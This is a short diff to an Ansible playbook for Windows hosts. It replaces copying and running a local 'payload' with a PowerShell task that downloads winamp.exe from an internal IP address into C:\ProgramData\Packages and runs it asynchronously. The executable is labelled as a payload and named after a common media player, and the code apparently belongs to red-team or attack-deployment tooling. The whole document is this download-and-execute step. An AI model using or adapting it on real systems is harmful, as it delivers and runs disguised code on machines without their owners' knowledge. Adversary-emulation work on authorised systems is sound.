@@ -1,7 +1,6 @@
-- name: Copy payload to host
-  ansible.windows.win_copy:
-    src: ./winamp.exe
-    dest: 'C:\ProgramData\Packages\winamp.exe'
-
-- name: Run payload
-  ansible.windows.win_command: C:\ProgramData\Packages\winamp.exe
+- name: Copy and execute payload to host
+  ansible.windows.win_shell: |
+    Invoke-WebRequest -uri http://10.96.11.9/winamp.exe -OutFile C:\ProgramData\Packages\winamp.exe
+    C:\ProgramData\Packages\winamp.exe
+  async: 10
+  poll: 0
